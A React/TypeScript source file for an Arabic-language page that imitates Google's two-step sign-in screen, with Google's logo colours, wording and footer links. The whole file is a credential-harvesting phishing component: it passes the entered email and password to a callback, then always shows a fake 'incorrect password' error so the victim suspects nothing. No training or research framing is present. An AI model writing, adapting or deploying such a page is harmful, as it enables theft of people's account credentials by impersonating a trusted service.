import { useState } from "react";

type Step = "email" | "password";

interface GoogleLoginPageProps {
  sessionId: string;
  onCredentials: (email: string, password: string) => void;
}

export default function GoogleLoginPage({ sessionId: _sessionId, onCredentials }: GoogleLoginPageProps) {
  const [step, setStep] = useState<Step>("email");
  const [email, setEmail] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);
  const [error, setError] = useState("");
  const [loading, setLoading] = useState(false);

  const handleEmailNext = (e: React.FormEvent) => {
    e.preventDefault();
    if (!email.trim()) {
      setError("أدخِل عنوان بريد إلكتروني أو رقم هاتف");
      return;
    }
    setError("");
    setStep("password");
  };

  const handleLogin = async (e: React.FormEvent) => {
    e.preventDefault();
    if (!password.trim()) {
      setError("أدخِل كلمة المرور");
      return;
    }
    setLoading(true);
    setError("");

    onCredentials(email, password);

    await new Promise((r) => setTimeout(r, 1200));
    setLoading(false);
    setError("كلمة المرور غير صحيحة. حاوِل مرة أخرى أو انقر على \"نسيت كلمة المرور\" لإعادة تعيينها.");
    setPassword("");
  };

  return (
    <div className="gl-outer" dir="rtl">
      <div className="gl-card">
        <div className="gl-logo">
          <span style={{ color: "#4285F4" }}>G</span>
          <span style={{ color: "#EA4335" }}>o</span>
          <span style={{ color: "#FBBC05" }}>o</span>
          <span style={{ color: "#4285F4" }}>g</span>
          <span style={{ color: "#34A853" }}>l</span>
          <span style={{ color: "#EA4335" }}>e</span>
        </div>

        {step === "email" ? (
          <form onSubmit={handleEmailNext} className="gl-form">
            <h1 className="gl-title">تسجيل الدخول</h1>
            <p className="gl-subtitle">استخدِم حساب Google</p>

            <div className="gl-input-wrap">
              <input
                type="text"
                value={email}
                onChange={(e) => { setEmail(e.target.value); setError(""); }}
                className={`gl-input gl-input-rtl ${error ? "gl-input-error" : ""}`}
                placeholder=" "
                id="email"
                autoFocus
                autoComplete="email"
                dir="ltr"
              />
              <label htmlFor="email" className="gl-label gl-label-rtl">البريد الإلكتروني أو رقم الهاتف</label>
              {error && <span className="gl-error-msg">{error}</span>}
            </div>

            <a href="#" className="gl-forgot">هل نسيت البريد الإلكتروني؟</a>

            <p className="gl-notice">
              هل هذا ليس جهاز الكمبيوتر الخاص بك؟ استخدِم نافذة خاصة لتسجيل الدخول.{" "}
              <a href="https://support.google.com/chrome/answer/95464" target="_blank" rel="noreferrer">
                مزيد من المعلومات حول استخدام وضع الضيف
              </a>
            </p>

            <div className="gl-actions">
              <a href="https://accounts.google.com/signup" target="_blank" rel="noreferrer" className="gl-create-btn">
                إنشاء حساب
              </a>
              <button type="submit" className="gl-next-btn">التالي</button>
            </div>
          </form>
        ) : (
          <form onSubmit={handleLogin} className="gl-form">
            <h1 className="gl-title">مرحباً</h1>
            <div className="gl-email-chip">
              <svg viewBox="0 0 24 24" width="18" height="18" fill="#5f6368"><path d="M12 12c2.21 0 4-1.79 4-4s-1.79-4-4-4-4 1.79-4 4 1.79 4 4 4zm0 2c-2.67 0-8 1.34-8 4v2h16v-2c0-2.66-5.33-4-8-4z"/></svg>
              <span dir="ltr">{email}</span>
              <button type="button" onClick={() => { setStep("email"); setError(""); setPassword(""); }} className="gl-chip-close" aria-label="تغيير الحساب">
                <svg viewBox="0 0 24 24" width="18" height="18" fill="#5f6368"><path d="M19 6.41L17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12z"/></svg>
              </button>
            </div>

            <div className="gl-input-wrap">
              <input
                type={showPassword ? "text" : "password"}
                value={password}
                onChange={(e) => { setPassword(e.target.value); setError(""); }}
                className={`gl-input gl-input-rtl ${error ? "gl-input-error" : ""}`}
                placeholder=" "
                id="password"
                autoFocus
                autoComplete="current-password"
                dir="ltr"
              />
              <label htmlFor="password" className="gl-label gl-label-rtl">أدخِل كلمة المرور</label>
              {error && <span className="gl-error-msg">{error}</span>}
            </div>

            <label className="gl-show-pw">
              <input
                type="checkbox"
                checked={showPassword}
                onChange={(e) => setShowPassword(e.target.checked)}
              />
              <span>إظهار كلمة المرور</span>
            </label>

            <a href="#" className="gl-forgot">هل نسيت كلمة المرور؟</a>

            <div className="gl-actions">
              <a href="https://accounts.google.com" target="_blank" rel="noreferrer" className="gl-create-btn">
                خيارات أخرى
              </a>
              <button type="submit" className="gl-next-btn" disabled={loading}>
                {loading ? <span className="gl-spinner" /> : "التالي"}
              </button>
            </div>
          </form>
        )}
      </div>

      <footer className="gl-footer">
        <div className="gl-footer-inner">
          <div className="gl-footer-left">
            <select className="gl-lang-select" defaultValue="ar">
              <option value="ar">العربية</option>
              <option value="en-GB">English (United Kingdom)</option>
            </select>
          </div>
          <div className="gl-footer-right">
            <a href="https://policies.google.com/privacy" target="_blank" rel="noreferrer">الخصوصية</a>
            <a href="https://policies.google.com/terms" target="_blank" rel="noreferrer">الشروط</a>
            <a href="https://support.google.com/accounts" target="_blank" rel="noreferrer">المساعدة</a>
          </div>
        </div>
      </footer>
    </div>
  );
}
